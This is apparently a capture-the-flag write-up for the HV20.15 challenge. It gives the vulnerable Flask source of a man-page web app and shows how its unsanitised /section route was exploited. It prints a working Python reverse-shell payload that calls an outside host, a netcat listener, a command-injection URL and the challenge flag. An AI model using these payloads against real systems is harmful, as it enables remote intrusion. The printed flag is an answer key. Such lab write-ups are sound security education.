# HV20.15 Man Commands, Server Lost

| <!-- --> | <!-- --> |
| --- | --- |
| **Author**     | inik |
| **Level**      | hard |
| **Categories** | `penetration testing`, `web security` |

## Description
Elf4711 has written a cool front end for the linux man pages. Soon after publishing he got pwned. In the meantime he found out the reason and improved his code. So now he is sure it's unpwnable.

### Notes
- You need to start the web application from the `RESOURCES` section on top
- This challenge requires a VPN connection into the Hacking-Lab. Check out the document in the `RESOURCES` section.

### Hints
- Don't miss the source code link on the man page

## Approach

The web application at hand serves man pages over the web. The following source code was supplied:
```python
# flask_web/app.py

from flask import Flask,render_template,redirect, url_for, request
import os
import subprocess
import re

app = Flask(__name__)

class ManPage:
  def __init__(self, name, section, description):
    self.name = name
    self.section = section
    self.description = description

@app.route('/')
def main():
  return redirect('/man/1/man')

@app.route('/section/')
@app.route('/section/<nr>')
def section(nr="1"):
  s ='apropos -s ' + nr + " ."
  ret = os.popen('apropos -s ' + nr + " .").read()
  return render_template('section.html', commands=parseCommands(ret), nr=nr)

@app.route('/man/')
@app.route('/man/<section>/<command>')
def manpage(section=1, command="bash"):
  manFile = "/usr/share/man/man" + str(section) + "/" + command + "." + str(section) + ".gz"
  cmd = 'cat ' + manFile + '| gunzip | groff -mandoc -Thtml'
  try: 
    result = subprocess.run(['sh', '-c', cmd ], stdout=subprocess.PIPE)
  except subprocess.CalledProcessError as grepexc:                                                                                                   
    return render_template('manpage.html', command=command, manpage="NOT FOUND")

  html = result.stdout.decode("utf-8")
  htmlLinked = re.sub(r'(<b>|<i>)?([a-zA-Z0-9-_.]+)(</b>|</i>)?\(([1-8])\)', r'<a href="/man/\4/\2">\1\2\3</a><a href="/section/\4">(\4)</a>', html)
  htmlStripped = htmlLinked[htmlLinked.find('<body>') + 6:htmlLinked.find('</body>')]
  return render_template('manpage.html', command=command, manpage=htmlStripped)

@app.route('/search/', methods=["POST"])
def search(search="bash"):
  search = request.form.get('search')
  # FIXED Elf4711: Cleaned search string, so no RCE is possible anymore
  searchClean = re.sub(r"[;& ()$|]", "", search)
  ret = os.popen('apropos "' + searchClean + '"').read()
  return render_template('result.html', commands=parseCommands(ret), search=search)
  
def parseCommands(ret):
  commands = []
  for line in ret.split('\n'):
    l = line.split(' - ')
    if (len(l) > 1):
      m = l[0].split();
      manPage = ManPage(m[0], m[1].replace('(', '').replace(')',''), l[1])
      commands.append(manPage)
  return commands

if __name__ == "__main__":
  app.run(host='0.0.0.0' , port=7777)
```

Looking at the different paths, I decided not to try to abuse the `/search` path as there is some sanitisation done, disallowing some characters. The `/man` path concatenates the input into a file path, which is then used to compose a command line statement. To work around this, some constraints have to be overcome.

The easiest way to attack this application with the goal of getting a reverse shell, is by going for the `/section` path.

### Number 1 - Reverse shell
The following resource is an evergreen for reverse shell payloads and was also used for this challenge: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python

The chosen payload was:
```python
import sys,socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")
```

The final request looks as follows:
```
https://8a54be8b-5e4d-4a17-8607-afbb1bc35e14.idocker.vuln.land/section/1%20bash%20&&%20python3%20-c%20'import%20sys,socket,os,pty;s=socket.socket();s.connect(("10.13.0.5",6543));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn("sh")'
```

On the client side, I had to start a netcat to receive the shell and look for the file containing the flag - `/flag`:
```bash
nc -nlvp 6543
```

### Number 2 - Command injection
After knowing where the flag was hidden, a simple command injection also did the trick and made the challenge solvable without the need for a reverse shell.
```
https://8a54be8b-5e4d-4a17-8607-afbb1bc35e14.idocker.vuln.land/section/1 bash && cd .. && cd .. && cd ..&& cd ..&& cd ..&& cd ..&& cd ..&& cd ..&& cd ..&&echo 'bla (nop) - tsst' %60cat flag%60
```

## Flag
`HV20{D0nt_f0rg3t_1nputV4l1d4t10n!!!}`

## Tools
- BurpSuite
- Chrome
